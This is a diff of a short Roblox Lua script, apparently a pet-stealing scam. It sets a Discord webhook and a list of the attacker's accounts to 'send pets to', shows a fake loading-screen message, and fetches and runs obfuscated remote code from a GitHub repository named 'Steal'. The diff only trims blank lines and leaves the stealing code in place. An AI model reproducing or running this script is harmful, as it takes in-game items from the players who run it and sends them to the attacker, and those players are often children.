@@ -1,6 +1,4 @@
 ```lua
-
-
 Webhook = "" --your discord webhook
 Usernames = {} --put the name of all your accounts and alts to send pets to (from important to less important)
 
@@ -21,6 +19,4 @@ end)
 game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = LoadingScreenText
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Cezar-Very-Epic/Steal/main/Obfuscated%20Custom%20Loading%20Screen"))()
-
-
 ```
